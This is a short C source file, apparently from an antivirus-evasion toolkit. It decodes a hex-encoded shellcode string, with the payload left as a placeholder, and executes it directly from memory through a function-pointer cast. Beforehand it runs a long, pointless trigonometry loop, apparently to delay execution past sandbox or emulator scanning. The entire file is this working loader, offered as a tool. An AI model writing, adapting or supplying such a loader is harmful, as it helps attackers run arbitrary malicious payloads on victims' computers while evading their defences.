/*
Author: Daniel Sauder
Filename: math.c
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>
#include <math.h>

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
  int j=0;
  shellcode=malloc((size/2));

  int i=0;
  do
  {
    unsigned char temp[3]={0};
    sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
    shellcode[j] = strtoul(temp, NULL, 16);

    i+=2;
    j++;
  } while(i<size);

  return shellcode;
}


int main (int argc, char **argv)
{
	//unsigned char *buffer;
	unsigned char *shellcode;
	unsigned char buffer[]= "encoded shellcode";

	int x,y;
	for (x=1; x<10000; x++)
	{
		for (y=1; y<10000; y++)
		{
			int a=cos(x);
			int b=cos(y);
			double c=sin(x);
			double d=sin(y);
		}
	}


	int size = sizeof(buffer);

	shellcode = decode_shellcode(buffer,shellcode,size);
	exec_shellcode(shellcode);
}
